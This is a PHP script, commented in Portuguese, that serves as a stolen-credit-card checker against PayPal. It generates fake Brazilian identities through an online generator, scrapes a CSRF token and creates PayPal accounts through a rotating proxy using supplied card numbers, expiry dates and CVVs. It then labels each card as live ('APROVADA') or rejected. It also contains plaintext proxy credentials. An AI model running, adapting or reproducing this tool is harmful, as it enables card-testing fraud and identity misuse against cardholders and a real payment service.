<?php
error_reporting(0);


//---------------------------//Definindo TOKEN//------------------------//
$TOKEN = "EC-0H0427393F029802K".mt_rand();
//---------------------------//Gerador 4Devs//------------------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.4devs.com.br/ferramentas_online.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'acao=gerar_pessoa&sexo=H&idade=22&pontuacao=S&cep_estado=&cep_cidade=');
$dados = curl_exec($ch);

$dados1 = json_decode($dados, true);

$name = $dados1["nome"];
$cpf = $dados1["cpf"];
$cep = $dados1["cep"];
$endereco = $dados1["endereco"];
$celular = $dados1["celular"];
$email = mt_rand();
//--------------------------------------------------------------------//


function getStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


extract($_REQUEST);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];

function bin ($cartao){

        $contents = file_get_contents("bins.csv");
        $pattern = preg_quote(substr($cartao, 0, 6), '/');
        $pattern = "/^.*$pattern.*\$/m";
        if (preg_match_all($pattern, $contents, $matches)) {
            $encontrada = implode("\n", $matches[0]);
        }
        $pieces = explode(";", $encontrada);
        return "$pieces[1] $pieces[2] $pieces[3] $pieces[4] $pieces[5]";
    }
$bin = bin($lista);


//$username = 'lum-customer-hl_5a094f32-zone-static';
//$password = 'dezpqqmxz71u';
//$port = 22225;
//$session = mt_rand();
//$super_proxy = 'zproxy.lum-superproxy.io';


//echo $Bandeira;
$cvv = $separar[3];



//=========================================//PAGAMENTO (1)//=========================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/webapps/hermes?flow=1-P&ulReturn=true&token='.$TOKEN.'&country.x=BR&locale.x=pt_BR#/checkout/pageAddCard/addCardFlow/addCard?message=NEED_CREDIT_CARD');

curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0'));
$Pagamento1 = curl_exec($ch);

$Csrf = GetStr($Pagamento1, '"x-csrf-jwt": "','",');
//==============================================//================================================//
//======================================//PAGAMENTO (2)//=========================================//



curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/webapps/xoonboarding/api/onboard/signup');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:80');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'qjurmnxm-rotate:vuwtpdd2ug68');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'origin: https://www.paypal.com',
'x-requested-with: XMLHttpRequest',
'x-csrf-jwt: '.$Csrf.'',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
'content-type: application/json;charset=UTF-8',
'referer: https://www.paypal.com/webscr?cmd=_express-checkout&amp;token='.$TOKEN.'',
'accept-encoding: gzip, deflate, br',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'cookie: ectoken=EC-'.$TOKEN.'; cookie_check=yes; _ga=GA1.2.372831685.1557948305; X-PP-K=1557948365:5:NA; 44907=YHNRDLBNYJP8U; _gcl_au=1.1.2120663241.1557948605; KHcl0EuY7AKSMgfvHl7J5E7hPtK=oo6nkqXADjfU-Dh4qrRfiO6Hur6WWdtp4NkHmQNRLk8CW142yzF8VbRHsDqRvSF5IB31xBMmVEK9Sgcn; ectoken=EC-882601460T298251M; cwrClyrK4LoCV1fydGbAxiNL6iG=UrgWsS8wfwhLrdbxeqHJi2nmpOKmkr6Jh-FuJq2K8E20Gpe6lJ3Idtv9mdl5DU88pquw33E4veym_KaqVtVyQ9MOY-E6HT6OKesS3N26OFgQsBYRhkEF98UGUEdH_bVEjsEa9WMA9ePnXInp4cvoZh3kaOLbMdmAvc2m05AYLElK0gufhzouUoMj6i6Kql_Xg-X9tPQqkLYPr8wP32QCfGUv37SE5IQfVUvMxu5awdhVnHL_Jx6xwlIaL_a; consumer_display=USER_HOMEPAGE%3D0%26USER_TARGETPAGE%3D0%26USER_FILTER_CHOICE%3D0%26BALANCE_MODULE_STATE%3D1%26GIFT_BALANCE_MODULE_STATE%3D1%26LAST_SELECTED_ALIAS_ID%3D0%26SELLING_GROUP%3D1%26PAYMENT_AND_RISK_GROUP%3D1%26SHIPPING_GROUP%3D1%26MCE2_ELIGIBILITY%3D4294967295; navcmd=_donations; login_email='.$email.'%40gmail.com; rmuc=MgYlVSGi9HuuskND499s8WNgiNfzPHBVb2Vuf5P81h3x1OLDjJ2ZtwqN4jOZ7ztgtX3t1lMLXrKnkV3BBg0caKrhF69fvLwZazLBcxFQ6pcXtotVsjt0vx0t2Spn5FK79MQS5iCTWam5ziHnwl8ufeofa-y_stUu6WngKG; pNTcMTtQfrJuaJiwEnWXQ6yNxfq=b_9EXFRtme2G499qFcC1c7V8KvgaDlUNtC4WvVr-LSbu4ZMrcYGtBAXyDfx3H5tHtiNWze86eRjSXNxnHrf1_LhHzWom-V0S1DR1SdF3mQ8jVNnUPoHI2GY_nXOtEA0Ej1OIC96JUoRcr2pVax6HsKMPmDY_mVcLQ_3D-HRcADnH-YOK-qYpxzbgfQBcLCyM-XkpSFqIuZRPc8_6dJeEDz7wAzGwW3ZvzmIrUW5I5JYdogzpyhBQuaU0nC5RjqHls_AS0-8db099MN-yojcG8FPLZaQi825WwM84OS1pIwDp_zwyab6ZCmpdYUtlFILPkKiLBqn99kiReLHCgds5Rw2TQH_pk0tqWE1oDh4kNs_cOjB7xoXKeyBZ_y0w5kdkVbLIVpGP8jSzy9DsY0N6xrwoFITwf1q0mlstT3W9xdsLT0AqSDIrlsuevKRFkwIaEslGlULX42bG2nPkOUn-IA_irxNSOjWBR_0MhwxPijPA25OpDE3WGgRMe_PQRkPkKZqlwekoqeiFPI8viVvSw0HtQliB4J7psmrSUF4FEUjzg4yHgUgr6Ez9ftFj0rV42aUmouhZOXUHy8Mz0UDne-VQcx1ETvm3yRMMATDzx9eQ7XDBiJjZVbwAKZlMvolNsitf_P_hYbWerVmmugbYN7BfT29XwTB_QJH6mDyBLy1i6pGPsh3VjfEba1cAZJ_j2xLoGr_Wot8k3R0YSVTMp-679PEk42PmkmVJkdC3KFZYuEVfF6Yw95sUwAYQu1_CJIMs1Qtan_leqDKkiwG2GDgLWtshiKH4rYKSsVCi_MU-m9tCod1-_ffZJIsPLVvah9R9TZO5ImLNOu2w-0VdZL-y80Sr1TXY7SzKrXMyDuOGENBf_el6NZcNk7VsmSqQbn1MhteDr4ilsS9Kc8TNiy6zYrq; LANG=pt_BR%3BBR; ts_c=vr%3Deaf2561c16aac12000140d88ffffd6ed%26vt%3D1954997216b0a1e9492550ddfff3897c; ui_experience=login_type%3DEMAIL_PASSWORD%26home%3D2%26ph_conf%3D2%253A1560452731132; DPz73K5mY4nlBaZpzRkjI3ZzAY3QMmrP=S23AAFt0lSCjlYV14CN3d8uFPpR5D9byFMVAVmZLaQTva28vtU2HQ_XvFyeeR1GTSL7AsoVd0FQlPRBRNqSFr0xoTr6oEFZ_g; fn_dt=EC-3A603124266368502; SEGM=; X-PP-ADS=AToBrKbhXD78mTIJYe-ZGvNqxMGqLUY7AQao8lzVsqZRKgbOZOQ.2iwIVEp4OwFmD.Rci.PukeNEWSrPyWZsZhr.bQ; id_token=; nsid=s%3As5sxe4VEOMUz0bzfsd8Dtx8iZNQeZMBu.7nikeWJeB9%2BOdYGPsB9vwEMUXTrsmffsvXmgJR3lg0g; tsrce=xoonboardingnodeweb; _gat_PayPal=1; AKDC=slc-b-origin-www-1.paypal.com; tcs=%7CsignupSubmit; x-pp-s=eyJ0IjoiMTU1OTUwMDUwODY3NiIsImwiOiIwIiwibSI6IjAifQ; x-csrf-jwt='.$crsf.'; X-PP-SILOVER=name%3DLIVE6.WEB.1%26silo_version%3D880%26app%3Dloggernodeweb%26TIME%3D3709269084%26HTTP_X_PP_AZ_LOCATOR%3Dccg23.lvs; akavpau_ppsd=1559501109~id=6d91f5937d25784a1ebaa8f42e9087b0; ts=vreXpYrS%3D1654194910%26vteXpYrS%3D1559502310%26vr%3Deaf2561c16aac12000140d88ffffd6ed%26vt%3D1954997216b0a1e9492550ddfff3897c'
));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"data":{"user":{"first_name":"'.$name.'","last_name":"siqueira","email":"'.$email.'@gmail.com","password":"pablo123","countryOfResidence":"BR","country":"BR","dob_day":"10","dob_month":"01","dob_year":"1988"},"billing_address":{"line1":"'.$endereco.'","line2":"Ipê","city":"Rio de janeiro","state":"Rio de janeiro","postal_code":"'.$cep.'","normalization_status":"NORMALIZED","country":"BR"},"shipping_address":{"first_name":"'.$name.'","last_name":"siqueira","line1":"'.$endereco.'","line2":"","city":"Rio de janeiro","state":"Rio de janeiro","postal_code":"'.$cep.'","country":"BR"},"phone":{"type":"Mobile","number":"'.$celular.'","countryCode":"55"},"testParams":{},"nationalIdModel":{"nationalId":{"type":"TAX_ID","subType":"CPF","value":"'.$cpf.'"}},"card":{"type":"","number":"'.$cc.'","security_code":"'.$cvv.'","expiry_month":"'.$mes.'","expiry_year":"'.$ano.'"}},"meta":{"token":"EC-3A603124266368502","calc":"4b8306a06566c","csci":"9da4aaa644fe445d9ab7b77f38272cdd","locale":{"country":"BR","language":"pt"},"state":"ui_checkout_multistepsignup_multistepsignupcreateaccount","app_name":"xoonboardingnodeweb"}}');
 $Pagamento2 = curl_exec($ch);

$js = json_decode($Pagamento2,true);

if (curl_error($ch)) {
    echo " ERROR - ".curl_error($ch)." - PROXY\n";
    return;
}


 if(strpos($Pagamento2, '"ack":"success"')){
    echo '<h6 align="left"><span class="badge badge-dark">APROVADA</span><font style="color: white;"> '.$lista.' | '.$bin.' <span class="badge badge-light"> RETORNO:SUCESSO!</span> <span class="badge badge-dark">#ALEX</span></h6>';



}else if(strpos($Pagamento2, '{"field":"cvv","issue":"INVALID"}')){
    echo '<h6 align="left"><span class="badge badge-dark">APROVADA</span><font style="color: white;"> '.$lista.' | '.$bin.' <span class="badge badge-light"> RETORNO:CVV INCORRETO</span> <span class="badge badge-dark">#ALEX</span></h6>';



}else if(strpos($Pagamento2, 'EXCEEDING_TOTAL_DUPLICATE_LIMIT')){
    echo '<h6 align="left"><span class="badge badge-dark">APROVADA</span><font style="color: white;"> '.$lista.' | '.$bin.' <span class="badge badge-light"> GG LIVE C/S SALDO</span> <span class="badge badge-dark">#ALEX</span></h6>';

}else{
    echo '<h6 align="left"><span class="badge badge-dark">REPROVADA</span><font style="color: white;"> '.$lista.' | '.$bin.' <span class="badge badge-light"> RETORNO:'.$js['errorData']['0'].'</span> <span class="badge badge-dark">#ALEX</span></h6>';

}



?>
